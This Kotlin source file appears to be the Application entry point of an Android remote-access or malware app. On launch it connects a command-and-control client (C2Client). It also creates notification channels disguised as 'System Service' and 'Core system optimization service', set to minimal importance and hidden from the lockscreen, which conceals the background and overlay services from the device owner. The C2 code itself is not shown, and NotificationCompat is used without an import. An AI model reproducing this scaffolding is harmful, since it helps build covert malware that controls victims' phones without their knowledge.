package com.xrc.app

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import com.xrc.app.c2.C2Client
import com.xrc.app.service.CoreService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class XRCApp : Application() {

    companion object {
        const val CHANNEL_CORE_ID = "xrc_core_channel"
        const val CHANNEL_OVERLAY_ID = "xrc_overlay_channel"
        const val CHANNEL_ALERTS_ID = "xrc_alerts_channel"
        lateinit var instance: XRCApp
            private set
    }

    val applicationScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    val c2Client = C2Client()

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannels()
        initializeC2()
    }

    private fun createNotificationChannels() {
        val manager = getSystemService(NotificationManager::class.java)

        val coreChannel = NotificationChannel(
            CHANNEL_CORE_ID,
            "System Service",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Core system optimization service"
            setShowBadge(false)
            lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
        }

        val overlayChannel = NotificationChannel(
            CHANNEL_OVERLAY_ID,
            "Overlay Service",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Overlay rendering service"
            setShowBadge(false)
            lockscreenVisibility = NotificationCompat.VISIBILITY_SECRET
        }

        val alertsChannel = NotificationChannel(
            CHANNEL_ALERTS_ID,
            "System Alerts",
            NotificationManager.IMPORTANCE_HIGH
        ).apply {
            description = "Critical system alerts"
            setShowBadge(true)
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            manager.createNotificationChannel(coreChannel)
            manager.createNotificationChannel(overlayChannel)
            manager.createNotificationChannel(alertsChannel)
        }
    }

    private fun initializeC2() {
        applicationScope.launch {
            c2Client.connect()
        }
    }
}
